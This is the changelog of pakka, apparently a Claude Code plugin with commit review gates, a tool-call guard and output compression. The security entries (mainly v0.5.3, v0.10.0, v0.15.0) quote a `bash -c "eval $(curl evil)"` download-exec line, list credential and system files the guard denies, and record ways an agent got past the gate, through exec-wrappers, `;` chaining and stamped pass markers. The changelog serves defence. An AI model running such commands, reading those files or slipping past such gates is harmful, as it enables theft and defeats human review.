# Changelog

All notable changes to pakka. Format follows [Keep a Changelog](https://keepachangelog.com).

## [v0.20.0] — 2026-07-29

The gate's last unmeasured claim becomes a measured rate. First published calibration: recall 1.00, precision 0.75, FP rate 0.67 (n=13 seeded bugs + 3 clean fixtures, zero infrastructure errors).

### Added
- **calibrate**: `make calibrate` runs the four live reviewer agents headless (Claude Code OAuth only — no API-key path exists, test-enforced) over the 16-seed corpus and scores against ground truth; artifacts carry per-seed verdicts, agent-prompt SHAs, and run counts; RECEIPTS gains a "review gate calibration" section with recall/precision/FP rate/n/model, or "unmeasured" when no run exists. Infrastructure failures never pose as reviewer performance: timeout/error seeds are excluded from denominators and majority parse-failure marks the run degraded (1c5473f)

### Fixed
- **calibrate**: seed patch path resolved before the temp-repo cwd switch — first live run errored all 16 seeds (42ce29e)
- **seeds**: four corpus patches had overdeclared @@ line counts ("corrupt patch", latent since v0.11) and ten expected.json line_approx values pointed at comment/header regions instead of the planted bug — both classes now guarded by corpus tests that apply every seed and validate every ground-truth location (5ffd877, 7ef1610)

## [v0.19.0] — 2026-07-24

Enterprise + DX release: the gate becomes org-enforceable, and re-review follows content instead of a timer.

### Added
- **policy**: committed `.pakka/policy.json` floor enforced in-binary — confidence clamps (strict direction only), locked guard categories (unknown names fail closed), input-compress lock, and a present policy forces the gate on regardless of local `autoGate`. Malformed/newer-version policy fails closed; absent policy is exact v0.18.0 behavior with a per-run `policy-state` audit note. Git is the distribution — no server (71151cd)

### Changed
- **gate**: marker freshness is diff-bound — a findings-bound marker matching the staged diff stays valid 1800s (was flat 300s), 3600s hard ceiling, policy may lower. Content binding (v0.15.0) is the integrity mechanism; the timer stops taxing iteration (71151cd)

## [v0.18.0] — 2026-07-24

Consolidation after six releases in three days: drift verified, decisions recorded, one small feature to get those releases into users' hands.

### Added
- **statusline**: upgrade visibility — `↑<version>` segment (ASCII `^` fallback) when a newer plugin version sits in the local cache beside the running one; pure readdir, mtime-cached, zero network (75b2439)

### Fixed
- **docs**: eval layer-1 clean — five command/agent docs had prose lines over the 200-char limit accumulated across v0.13–v0.17 edits; wrapped, rendering identical, 12/12 targets pass (8040ab7)

### Changed
- **docs**: DESIGN.md v0 build plan marked historical, pointing at living docs; memory/DECISIONS.md backfilled with the week's seven decision entries (8040ab7)

## [v0.17.0] — 2026-07-24

Closes the v0.12.0 latency disclosure: every hook budget now passes, with the cause measured and named.

### Added
- **perf**: `pakka-hot` slim hook binary — guard, commit-gate, and status-line run without the fat binary's startup floor (measured: ~4ms modernc.org/sqlite init via recall + ~1.8ms net/http init via the semantic client). Floor p50 9.7ms → 3.8ms; guard p95 4.3–5.0ms (<10ms PASS); commit-gate passthrough p95 4.2ms (<5ms PASS, was 9.2–11.4ms). `bin/run` routes hot subcommands to `pakka-hot` when present, falls back to `pakka-core`. Report: `benchmarks/latency-v0.17.0.md` (ddfc775)
- **statusline**: per-project-dir cwd/repo resolution cached by dir mtime — unchanged dirs cost zero file opens and zero git execs per render; closes #36 (ddfc775)

### Changed
- **internal**: command code moved `cmd/pakka-core` → `internal/cli`; hot commands → `internal/hotcli`; level parsing → `internal/compress/level`; compress-state stale decoding single-sourced in `internal/compress/cstate`. No behavior change; release ships five `pakka-hot-*` binaries alongside `pakka-core-*`, all covered by SHA256SUMS + attestation (ddfc775)

### Triage (2026-07-24)
- #33 closed — fixed by v0.15.0 trailer splice. #17 remains deferred (plugin split; no longer the latency tracker). #36 closed by this release. #14 deferred pending review-verdict corpus.

## [v0.16.0] — 2026-07-23

Completes the gate-integrity arc: v0.15.0 proved what diff was reviewed; v0.16.0 proves what the review found.

### Added
- **gate**: review provenance — `pakka-core review-pass --findings <verdict.jsonl>` binds the findings file's SHA-256 and severity counts into the pass marker; the gate re-hashes at commit time and blocks swapped or mutated evidence; the `Reviewed-by-pakka` trailer permanently carries `diff:<8hex>` and `findings:<8hex> (<E> errors, <W> warnings)`; each bound pass writes a `review-verdict` audit entry whose rationale text is searchable via `/pakka:recall` — no recall schema change (9fbd17c)

## [v0.15.1] — 2026-07-22

### Fixed
- **spec-generate**: output anchors to the git toplevel (`--repo-root` to override); outside a repo it errors without writing. Previously CWD-relative — a drifted shell CWD silently filed a spec into a sibling repo (86a8a3e)

### Added
- **hooks**: regression test pinning that the SessionStart matcher covers source `"compact"` — post-compaction re-injection of the discipline block depends on it. Investigated and rejected PostCompact-as-injector: CC 2.1 PostCompact is side-effects-only, its output discarded; registering it would have shipped a silent no-op (86a8a3e)

## [v0.15.0] — 2026-07-22

Gate integrity release. One day of dogfooding v0.13.0/v0.14.0 showed the review gate's pass-marker was a bare timestamp any process could stamp — five deliberate stamps in a single day, none verifiable against what was reviewed. The gate now proves what it claims to prove.

### Added
- **gate**: diff-bound review pass markers — `pakka-core review-pass` (with `--repo-root`) writes JSON `{ts, diffSHA256, verdict}` hashing the exact staged diff; the commit gate recomputes and requires a fresh match, so a pass for one diff can never authorize another. Legacy bare-epoch markers are rejected with an upgrade message (8f8237a)

### Fixed
- **gate**: `Reviewed-by-pakka` attestation trailer (prepare-commit-msg hook) now verifies diffSHA256 before stamping — unreviewed commits inside a pass window no longer receive the reviewed trailer (8f8237a)
- **gate**: injected `--trailer` flags splice before a user `--` pathspec separator instead of being parsed as pathspecs — `git commit -- <paths>` works under the gate (8f8237a)

## [v0.14.0] — 2026-07-22

Closes the remaining enterprise-feedback promise (measured output reduction) and fixes a data-loss bug the release-drift audit surfaced live.

### Added
- **meter**: measured output-reduction ratios — `make bench` A/B runs persist per-repo+model+level reduction ratios (`~/.pakka/bench-ratios.json`, lock-guarded running-mean merge); statusline and RECEIPTS resolve measured ratios first (mtime+size-cached off the render hot path), calibrated constant as fallback, provenance disclosed as "measured, n=K" or "default calibration" (42dfb29)

### Fixed
- **compress**: state entries with empty `outputSHA` (prior validator failure) no longer clobber user edits — the live file is adopted as source of truth and the `.original.md` snapshot refreshed before any rewrite. Previously the first successful rewrite after a failure streak replaced the live file with content compressed from a months-old snapshot; this destroyed six weeks of edits to the monorepo root CLAUDE.md before being caught in the v0.13.0 release drift audit (9feeb20)

### Changed
- **docs**: README leads with gates/audit; compression positioned as cost bonus, with explicit cached-environment guidance (bec6bc4)

## [v0.13.0] — 2026-07-22

Enterprise-feedback release: honest savings accounting, input compression made opt-in, verifiable supply chain. Driver: external audit of pakka in a heavily cached (Bedrock) environment.

### Added
- **build**: reproducible release pipeline — `make release` refuses a dirty tree, builds with `-trimpath` + `CGO_ENABLED=0`, emits `SHA256SUMS`; tag-triggered CI workflow (`release.yml`) builds from source, verifies the tree stays clean, and publishes assets (e25edd4)
- **build**: SLSA build-provenance attestation on every release asset (verify: `gh attestation verify <asset> -R amargautam/pakka`) + CycloneDX SBOM (`sbom.cdx.json`); CI fails hard if any artifact or checksum is missing (4062318, f4e9960)
- **security**: SECURITY.md "Verifying Releases" — checksum validation, attestation verification, SBOM location, reproduce-at-tag instructions; release checklist gains a mandatory supply-chain gate

### Changed
- **compress**: input-file (context-file) compression is now **opt-in, default off** — enable with `PAKKA_INPUT_COMPRESS=1` or settings `pakka.compress.input: true`; manual `/pakka:compress` is unchanged. Rationale: near-zero savings on terse files against the cost of rewriting version-controlled files and sending their contents to the model provider. Output, tool-result, and subagent-return vectors unchanged (21fdf65)
- **build**: shipped binaries regenerated from committed source — `vcs.modified=false`, `vcs.revision` matches HEAD; previously built from an uncommitted working tree (f1cd4fa)

### Fixed
- **meter**: input-side `$` savings now priced at a blended cache-aware rate — fresh 1×, cache-write 1.25×, cache-read 0.1×, weighted by the session's actual telemetry; falls back to the flat fresh-input rate when telemetry is absent. Previously every saved input token was priced at the full fresh-input rate with no concept of prompt caching, overstating input savings by ~10× in heavily cached environments (a0dddc7)
- **docs**: README "no dial-home" claim made precise — no telemetry to pakka ever; the one egress path (semantic input compression → your configured model provider) is named, with kill-switch and restore documented (7cf1fed)

## [v0.12.1] — 2026-07-21

### Fixed
- **statusline**: `$` saved figure is repo-cumulative again on CC 2.1 native payloads. #30 sourced the in/out token figures — and thus the `$`-saved output side and savings-% denominator — from the session-scoped `context_window.current_usage`, regressing the figure from cumulative-per-repo to live-session. The native payload now feeds only the ctx segment; all cumulative figures come from the cached transcript scan (#34)

## [v0.12.0] — 2026-07-21

### Added
- **statusline**: Claude Code 2.1 native `statusLine` payload support — context-window usage read from hook stdin (cost parsed for future use), zero transcript IO on the render hot path; transcript-scan fallback retained for older Claude Code (#30)
- **plugin**: `displayName` field in `plugin.json` (#30)
- **bench**: hook hot-path latency benchmark harness (`make bench-latency`) + `benchmarks/latency-v0.12.0.md` (#31)

### Fixed
- **compress**: compression level fallbacks converged on a single source (`semantic.ParseLevel` via `resolveOutputLevel`) — the configured level now applies uniformly across the pipeline (#28, #29)
- **output-rules**: runtime ruleset + command docs corrected to the `super-ultra` default (first release carrying the fix) (#26, #27)

### Known
- **commitgate**: non-commit passthrough p95 9.2ms vs 5ms budget — shared binary startup floor (SQLite via recall); documented, fix tracked in #17

## [v0.11.0] — 2026-06-11

### Added
- **review**: performance reviewer agent — fourth parallel lens (`kind="performance"`) plus 3 performance eval seeds (#16, #20)
- **bench**: claude-code OAuth A/B harness — `make bench` runs pakka-vs-raw via `claude -p` on the existing session; `PAKKA_DISABLED` kill-switch in `bin/run` and all JS hooks isolates the raw arm; zero API-key dependency (#13, #23)
- **guard**: learned per-repo allowlist at `.pakka/guard-allowlist.json` — repeated user overrides teach guard, with override-count decay; secret categories are never allowlistable (#12, #24)
- **compress**: semantic rewriter injection gate — delta-based instruction-shape detection on rewritten output; strict fallback plus audit entry on rejection (#15, #21)

### Changed
- **RECEIPTS disclosure**: output-tokens figure re-based. The previously published 5,939,566 summed per-session repo-wide snapshots, triangular-overcounting the true cumulative. v0.11.0's canonical `repo_root` attribution (symlink-resolved git toplevel, workspace-root aware) plus max-snapshot semantics yields ~1,019,833 cumulative output tokens. Not a regression — corrected measurement; ratchet test re-based to the new floor. See `memory/DECISIONS.md` "v0.11.0 decisions" (#10, #22)
- **guard**: hook matcher widened `Read|Bash` → `Read|Write|Edit|MultiEdit|Bash` — guard's secret-WRITE protection is now active (#24)

### Fixed
- **commitgate**: `[skip pakka]` honored on AST reject paths — was only respected on the legacy path (#8, #18)
- **skill-check**: directive-intent filter — bare keyword mentions no longer trigger alerts; scan bounded to ~1ms on adversarial input (#11, #19)
- **meter**: canonical `repo_root` attribution via `EvalSymlinks` and workspace-root resolution; `backfill-output-tokens` retags historical entries from transcript cwd (#10, #22)
- **pricing**: `claude-fable-5` / `claude-mythos-5` / `claude-opus-4-8` entries; dated-ID prefix fallback for unknown model IDs (#25)

## [v0.10.0] — 2026-06-11

### Fixed
- commitgate: block indirect commits via exec-wrappers (`xargs`/`env`/`sudo`/`nohup`/`timeout`/…) that previously bypassed the gate ungated
- commit-gate: skip review-state git subprocesses on non-commit Bash commands (removes per-command hot-path latency)
- commitgate: write gate verdicts for chained and wrapped commit shapes recognised only by the AST path (new `Decision.IsCommit`)
- meter: use the full sanitized session id as the meter filename (was truncated to 8 chars → cross-session file collisions)
- recall: sanitize FTS5 queries — operator characters (`:`, `(`, `*`, `"`, `AND`) no longer crash the query
- report: output-tokens figure is now the max repo-filtered cumulative snapshot, not a triangular sum of snapshots
- bin/run: rotate `~/.pakka/debug.log` at 2 MB (was unbounded)

### Changed
- statusline: meter reads cached (`meter-cache.json`, mtime+size keyed); `$` savings now labeled `(est)` to mark the constant-multiplier output estimate
- docs: marketplace README updated to the 8-hub command surface; `pakka/CLAUDE.md` recall scope corrected

## [v0.9.0] — 2026-06-02

### Added
- **commit-gate**: AST-based parser via `mvdan.cc/sh/v3` supports chained shapes — git add then commit then push patterns, env prefix, subshells, redirects (criteria 1-8 of spec)
- **pakka-core**: `backfill-output-tokens` subcommand recovers historical session output_tokens from transcripts still on disk

### Changed
- **meter**: persists `output_tokens` per session-end; RECEIPTS figure now monotonic across releases (no longer shrinks as Claude Code rotates transcripts)
- **release**: checklist step 1.5 part 2 made conditional; new substep 0.1 runnable doc-sync audit

### Fixed
- **commit-gate**: closes the disease behind v0.8.1 — substring fallback no longer needed since AST handles all real invocations

## [v0.8.1] — 2026-06-01

### Fixed
- **commit-gate**: substring fallback no longer rejects non-git bash commands that mention "git commit" in quoted arguments (#3)

## [v0.8.0] — 2026-05-09

### Fixed
- **orchestrator**: user edits to live compressed files now survive compression level changes — edits were previously silently overwritten when level changed; fix detects edit via `OutputSHA` comparison and adopts live file as new baseline before re-compressing
- **orchestrator**: snapshot refresh failure now aborts the compression pass rather than proceeding with stale content — prevents user-edited live file from being overwritten when `.original.md` write fails

### Added
- **state**: `OutputSHA` field in `Entry` (JSON: `outputSHA`) — records SHA of last compression output; empty = legacy entry, user-edit check skipped
- **state**: `GetOutputSHA(absPath string) string` method
- **docs**: spec `2026-05-09-compress-user-edit-preservation.md` (Status: implemented)

## [v0.7.0] — 2026-05-09

### Fixed
- **report**: `fmtInt` MinInt64 guard — infinite recursion on crafted JSONL input eliminated
- **validator**: `reInlineCode` `{2,}` → `{1,}` — single-char identifiers (`i`, `x`, `-v`) now preserved
- **validator**: `reEnvVar` extended to `${VAR}`, `${var}`, `$var` (braced and lowercase forms)
- **validator**: `reVersion` extended to semver pre-release/build suffixes (`-rc1`, `+build.42`)
- **validator**: `reMarker` case-insensitive — `todo`, `Todo`, `TODO` all protected
- **validator**: `reFencedTriple`/`reFencedTilde` language tag includes `#` and `.` — `c#`, `f#`, `.proto` fences now validated
- **validator**: `rePathAbs` trailing punctuation stripped from captures — fewer false-positive validator retries
- **meter**: `estimateTokens` calibrated to 3.5 bytes/token (was 4) — consistent with `WriteSavings`
- **recall**: rune-safe preview truncation — no more split UTF-8 codepoints in JSON output
- **stackgate**: quote chars (`"`, `'`) added to `shellMetaRe` — explicit unquoted-argv contract enforced

### Added
- **internal/claudecli**: extracted shared package for `claude -p` argv construction — single source of truth for both `specfind` and `compress/semantic` callers
- **orchestrator**: `RunAsync()` now returns error; fork failures logged via `debugLogf`

## [v0.6.0] — 2026-05-09

### Fixed
- **recall**: non-EOF read errors no longer advance `last_offset` — silent index data loss eliminated
- **compress**: language tag preserved on code fences in non-strict modes (was always stripped)
- **compress**: heading dedup is consecutive-only — repeated headings in different sections no longer silently dropped
- **compress/meter**: negative compression (inflation) now written to meter — honest aggregate accounting
- **linguistic**: `maybe`/`perhaps` removed from drop list — epistemic inversion prevented
- **linguistic**: article-`a` rule made case-sensitive — "Plan A", "Press A to continue", "vitamin A" no longer mangled
- **validator**: `reInteger` — standalone integers ≥2 digits now preserved (ports, timeouts, counts)
- **validator**: `rePathAbs` leading-anchor extended to `:`, `=`, `"`, `'`, `<`, `>` — paths in config values now protected
- **commitgate**: session nonce in `Reviewed-by-pakka:` trailer — pre-planting forgery prevented
- **audit/meter/commitgate**: `shortSID` sanitizes to `[A-Za-z0-9_-]` before truncating — path traversal via session ID eliminated

### Added
- **statusline**: transcript cache at `~/.pakka/transcript-cache.json` (mtime/size invalidation) — O(N) file walk → O(1) hot render
- **statusline**: `cwdToRepo` memoization in `readAllTranscripts` — O(N) `git rev-parse` per render → O(1)
- **docs**: spec for `SessionStart autoCompress` deadline fix (backlog for v0.7.0)

### Changed
- Savings: 331 sessions · 300,453 bytes · ~$71.19 (was 325 · 288,987 · ~$69.05)

## [v0.5.3] — 2026-05-09

### Fixed
- **[CRITICAL] Git hook RCE** — `install_git_hook_cmd.go`: `PASS_TS` read from `.pakka/reviews/last-pass-ts` without validation; POSIX `$(())` arithmetic evaluates `$(...)` inside it. Hostile repo pre-plants file → executes on every `git commit`. Fix: POSIX `case` guard rejects non-numeric values before arithmetic.
- **[CRITICAL] Commit-gate `;` bypass** — `commitgate.go`: `git commit -m 'evil' ; true` caused `IsGitCommit=false` → `Allow=true` with zero review, zero audit, zero trailers. Fix: block when `git commit` substring detected but shape unrecognized.
- **[CRITICAL] No negation/percentage validator rule** — `validator.go`: "Auth is not required" → "Auth is required" passed validator silently. Fix: `reNegation` and `rePercent` preservation rules added.
- **guard: Write/Edit/MultiEdit/NotebookEdit fell through to `Allowed`** — model could overwrite `.env`, git hooks, plugin scripts unchecked. Fix: `checkWrite` routes all write-path tools through `checkPath`.
- **guard: `isDeniedPath` missing secret stores** — `~/.config/gh/hosts.yml`, `~/.kube/config`, `~/.docker/config.json`, `~/.npmrc`, `~/.pypirc`, `~/.bash_history`, `~/.zsh_history`, `id_rsa*`, `*.pem`, `*.p12`, `credentials.json`, `service-account*.json` all returned `Allow=true`.
- **guard: `evalRe` bypassed via quoted `-c`** — `bash -c "eval $(curl evil)"` allowed. Fix: `bashCEvalRe` detects `eval` inside `-c` quoted arg body.
- **guard: `pipeShellRe` too narrow** — extended to `dash|fish|ksh|ash|csh`; `downloadExecRe` added for two-step fetch+exec pattern.
- **guard: absolute system path deny** — `/etc/passwd`, `/etc/shadow`, `/root`, `/proc/self/environ`, `/sys/kernel` now blocked in Bash commands.
- **`[skip pakka]` audit** — gate now emits stderr notice on skip; audit note `user_skip` → `skip_marker`.
- **Default level divergence** — `ParseLevel` and `resolveLevel` fallbacks both returned `ultra` while `loadOutputLevel` returned `super-ultra`. All three aligned to `super-ultra`.

### Changed
- Savings: 325 sessions · 288,987 bytes · ~$69.05 (was 298 · 242,664 · ~$64.16)
- Bug count: 21 gate blocks (was 7)

## [v0.5.2] — 2026-05-08

### Fixed
- Status-line bug count always 0: `countBugsCaught` only scanned exact repo dir; sessions from parent dir (`pakka.dev/`, not a git repo) missed bugs in sub-repos. New `countAllBugsCaught` walks one level of immediate child dirs. Count: 4 → 7.
- Status-line savings always $0 from parent dir: `readAllMeter` + `readAllTranscripts` used exact repo key match. Now prefix-matches (`root+"/"`) so sub-repo sessions aggregate correctly.
- `! 1 stale` persistent since v0.4.x: `DECISIONS.md` always timed out at 60s (measured: ~92s actual for 15KB at super-ultra). Transient rewrite errors no longer record `validatorPasses=false` — stale glyph no longer shown for transient failures. `ClaudeCLI` timeout raised 60s → 180s.
- `[level]` bracket in status line now amber to match `pakka` label color.

### Changed
- Savings: 298 sessions · 242,664 bytes · ~$64.16 (was 269 · 198,590 · ~$46.79)
- Bug count: 7 (was 4, now counts sub-repo findings)

## [v0.5.1] — 2026-05-08

### Fixed

- Status-line color codes missing from v0.5.0 binaries — savings now green (111,208,140), bugs caught now red (232,99,74). Binaries were built before the color changes landed in `internal/statusline/statusline.go`.

## [v0.5.0] — 2026-05-08

### Added
- `pakka-core spec-generate` subcommand: validates 6 required sections, writes to `docs/specs/YYYY-MM-DD-<slug>.md`, hybrid diff on amend (git-tracked → `git diff`; untracked → `diff -u`), slug validated against path traversal
- `/pakka:plan` now pipes spec content to `spec-generate` via Bash (no `Write` tool)
- `commands/review.md` step 2b: spec-drift detection — warns when spec modified on current branch before merge (warning-level finding, not a gate block)
- `internal/statusline.ReadCWDFromTranscriptPath`: exported; `readProjectCWD` delegates to `readCWDFromSingleFile` (deduplication)
- Status-line ANSI 24-bit color: savings green `#6FD08C`, bugs caught red `#E8634A`

### Fixed
- Status-line CWD fix: derives cwd from `transcript_path` directory instead of `event.CWD` (which pointed at inner git sub-repo on split-repo setups), correcting savings display from ~$6 to ~$46
- `specfind`: date-prefixed specs (`YYYY-MM-DD-*.md`) skip LLM fallback — resolved via name-match only

### Security
- `spec-generate`: slug validated against `^[a-z0-9][a-z0-9-]*[a-z0-9]$` before path construction (prevents path traversal); `--` separator added to all exec.Command calls

## [v0.4.1] — 2026-05-07

### Fixed
- Commit-gate review loop: `HasRecentPass` was always false for `git -C <path> commit` and `cd <path> && git commit` — `last-pass-ts` and findings were read from process CWD, not the actual repo root. `parseCPath` + `resolveReviewsDir` now derive repo root from the commit command.
- Commit-gate timestamp format: gate expected unix epoch int; review skill wrote RFC3339. Dual-format parser (int64 → RFC3339 fallback) added; `review.md` updated to write `date +%s` going forward.
- `RECEIPTS.md` generation: `release` skill now uses `make self-report` (passes `--repo-root=..`). Running the binary without this flag silently uses wrong transcript scope (~7× undercount).
- Version string: `main.go` was stuck at `0.3.0`; corrected to `0.4.1`.

## [v0.4.0] — 2026-05-05

### Added
- `pakka-core spec-find`: discovers spec file for current change via name match → LLM fallback (`internal/specfind/`)
- Spec-anchored review: `/pakka:review` injects matched spec into all three reviewer agent prompts
- Reviewer agents (`reviewer`, `security`, `architect`) emit `spec-divergence` findings against spec acceptance criteria and out-of-scope items
- `docs/specs/` support: absent = silent skip; present + no match = advisory; matched = full spec context
- Judge prompt (`internal/specfind/spec_match_prompt.md`) embedded via `go:embed`

### Fixed
- `RECEIPTS.md` savings calculation: was using 2% heuristic (~$6); now reads actual output tokens from Claude Code transcripts (~$41)
- `pakka-core report --repo-root` flag: allows pointing at workspace root for transcript lookup

## [v0.3.0] — 2026-05-02

### Added
- `pakka-core recall`: FTS5 full-text index over audit trail (`~/.pakka/audit/*.jsonl`). `index` subcommand is idempotent; `query <text>` returns top-20 JSON-line results.
- `/pakka:recall [query]` command: no args shows last 10 entries; with query searches full audit history.
- `SessionEnd` hook: fires `pakka-core index` — current session entries queryable before next session starts.
- DB path: `$CLAUDE_PLUGIN_DATA/recall.db` (survives plugin updates), fallback `~/.pakka/recall.db`.
- Deterministic skill-check in `compress-track.js`: UserPromptSubmit hook keyword-scans every message; if build/plan/review signal detected, fires targeted alert before model responds — no model memory required.

### Changed
- `hooks/hooks.json`: added `SessionEnd` hook for recall indexing.

## [v0.2.6] — 2026-05-02

### Added

- `internal/pricing` — verified pricing table for 7 models (Opus 4.7/4.6/4.5, Sonnet 4.6/4.5, Haiku 4.5/3.5) sourced from Anthropic docs
- Status line now shows `~$X.XX saved` instead of token counts and fake percentages

### Changed

- `outputMultiplier` calibrated from real bench (Sonnet 4.6 + Opus 4.5, 2026-05-02): super-ultra 66% (was 44%), ultra 55% (was 40%), strict 33% (was 25%), lite 27% (was 10%)
- RECEIPTS.md: real $ estimate (~$6.12 total savings across 193 build sessions), removed all deferred/placeholder language
- DESIGN.md: compression budget updated with calibrated reduction table
- Website: $9.90/MTok output savings claim added to compress page and homepage

## [v0.2.5] — 2026-05-02

### Fixed

- Status line now shows full format: `pakka [level] · ↑Nk (X%) / ↓Nk (Y%) tokens saved · N bugs caught` — `Run()` was calling `formatLine()` but tests asserted the trimmed behavior, locking in the bug; both fixed
- Skill-check auto-trigger: injected as a dedicated isolated `SessionStart` hook (`hooks/skill-check-start.js`) instead of appended to compression output — model no longer rationalizes past it under task pressure

## [v0.2.4] — 2026-05-02

### Added

- `agents/architect.md` — third parallel review agent; catches coupling, shallow abstractions, and module bloat on every commit diff
- `rules/skill-check.md` — hard imperative routing rules injected at session start; `/pakka:plan`, `/pakka:build`, `/pakka:review` now auto-trigger on matching signals

### Fixed

- Skill-check was soft language ("if yes, invoke") — now `EXTREMELY_IMPORTANT` block with explicit trigger keywords and per-turn reinforcement; no more rationalization skips
- Status line blank for users — `/pakka:setup` init flow now writes `~/.pakka/bin/status-line` wrapper and `statusLine` block to `~/.claude/settings.json` automatically
- Status line wrapper used `pakka-pre` glob — corrected to `pakka`

### Changed

- `/pakka:review` runs three agents in parallel (reviewer + security + architect) — was two

## [v0.2.3] — 2026-05-02

### Fixed

- Deleted 10 alias command files (spec, tdd, debug, challenge, probe, map, slice, audit-code-arch, init, guard) — slash picker now shows exactly 7 hub commands, no stale aliases cluttering the list

## [v0.2.2] — 2026-05-02

### Fixed

- `rules/skill-invoke.md` updated to reference new hub commands — was pointing to old individual commands (`/pakka:spec`, `/pakka:tdd`, `/pakka:debug`, etc.); now routes to `/pakka:plan`, `/pakka:build`, `/pakka:review`

## [v0.2.1] — 2026-05-02

### Fixed

- Removed `skills/` directory — eliminated 14 `pakka:pakka-*` entries from skill list (dead weight since v0.2.0; hub commands have inline instructions)
- Inlined `skills/pakka-triage/SKILL.md` + `BRIEF-FORMAT.md` into `commands/triage.md`

## [v0.2.0] — 2026-05-02

### Added

- `/pakka:plan` — design hub: routes spec / challenge / probe / slice from context, writes to `docs/specs/`, never auto-chains to build
- `/pakka:build` — implementation hub: routes tdd / debug / map / audit from context, spec approval gate required, verification gate (exit codes) before done
- `/pakka:setup` — one-time init + guard hook; no arg → init, `guard` → guard hook
- Hook pre-handling: `/pakka:compress <level>` and `/pakka:help` handled by UserPromptSubmit hook — ~70% latency reduction, no LLM round-trip for config writes
- Ambient disciplines injected at session start: verification (exit code required before any "done" claim) + skill-check (route to plan/build/review when signal detected)
- Semantic compression auto-enable by level: `ultra` = on by default (user can opt out), `super-ultra` = enforced
- Mid-session level switch: full filtered ruleset emitted in `additionalContext` — takes effect immediately without session restart

### Changed

- Default compression level: `super-ultra` (was `ultra`)
- Command count: 14 → 7 — old commands (spec, challenge, probe, slice, tdd, debug, map, init, guard) redirect to new hubs via alias
- `main.go` 1625 → 67 lines: extracted into 16 `*_cmd.go` files + `helpers.go` + `command.go` interface
- `hookevent.go`: `Parse()` removed — callers use `parseStrict` / `parseLenient` in helpers.go

### Fixed

- `resolveOutputLevel` fallback: `'ultra'` → `'super-ultra'` to match new default

## [v0.1.4] — 2026-05-02

### Fixed

- Added `"version"` field to `plugin.json` — without it, all versions (v0.1.0–v0.1.3) resolved to the same plugin cache directory and updates never applied for existing users
- `/pakka:compress <level>` fix now actually active — `commands/compress.md` was correctly patched in v0.1.3 but never loaded due to cache invalidation bug above

### Upgrade

Existing users must reinstall manually to pick up this fix:
```
/plugin install pakka@pakka-marketplace
/reload-plugins
```

## [v0.1.3] — 2026-05-02

### Fixed

- `/pakka:compress <level>` fix applied to correct file (`commands/compress.md`) — v0.1.2 patched `skills/pakka-compress/SKILL.md` but Claude Code loads `commands/compress.md` for command invocations

## [v0.1.2] — 2026-05-02

### Fixed

- `/pakka:compress <level>` now writes to `~/.config/pakka/config.json` (`defaultLevel`) and `~/.claude/.pakka-level` flag file — persists across plugin reinstalls and takes effect immediately in current session
- Skip `--orchestrator-run` binary invocation when `semantic: false` — eliminates latency on every level switch

## [v0.1.1] — 2026-05-02

### Fixed

- Infinite loop in 11 commands caused by `allowed-tools: Skill` delegation — commands now read SKILL.md directly
- `compress` command: validate level arg before Bash invocation, remove shell injection vector, safe restore (no auto-delete of backups)
- Restore operation now requires explicit user confirmation before overwriting files

### Changed

- Renamed `/pakka:review-architecture` → `/pakka:audit-code-arch`
- `reviewer` and `security` agents upgraded to `opus`
- `statusline` decoupled from `orchestrator` — stale count passed by caller (main.go)

## [v0.1.0] — 2026-05-02

### Added

**10 engineering skills** — auto-invoked by trigger phrase, callable as `/pakka:<skill>`:

| Skill | Invokes when you say |
|---|---|
| `/pakka:spec` | "build X", "implement X", "add feature" |
| `/pakka:debug` | "debug", "fix this bug", "broken", "failing" |
| `/pakka:tdd` | "write tests", "TDD", "test first" |
| `/pakka:audit-code-arch` | "architecture", "coupling", "hard to test" |
| `/pakka:challenge` | "challenge this", "stress test my plan" |
| `/pakka:probe` | "probe me", "question my design" |
| `/pakka:map` | "how does X work", "explain this module" |
| `/pakka:triage` | "triage", "look at issue #N" |
| `/pakka:slice` | "break into tickets", "create issues" |
| `/pakka:guard` | "protect git", "block force push" |

**Skill auto-invocation** — `rules/skill-invoke.md` injected at session start. Claude invokes the right skill automatically without a slash command.

**4-vector output compression** — JS hooks inject per-level ruleset at session start and reinforce every turn. Levels: `lite`, `strict`, `ultra` (default), `super-ultra`. Switch with `/pakka:compress <level>`.

**`claude -p` subprocess as primary semantic-rewrite engine.** Zero-config for Claude Code users — pakka reuses existing `claude` auth on `PATH`.

### Changed

- **Status line:** `pakka [ultra]` — active compression level always visible.
- **Default output compression level: `ultra`** — pakka's brand thesis is fewer tokens.

### Fixed

- Stack-config command exec: metacharacters rejected; no `sh -c` path.
- Semantic-compression sandbox: `claude` subprocess runs with `--permission-mode default`.
- Audit hash full-width: `InputHash` now full SHA-256.
- Path traversal guard: regex catches 2+ hop `../`.
- Commit-gate trailer dedupe: repeated invocations no longer stack duplicate trailers.
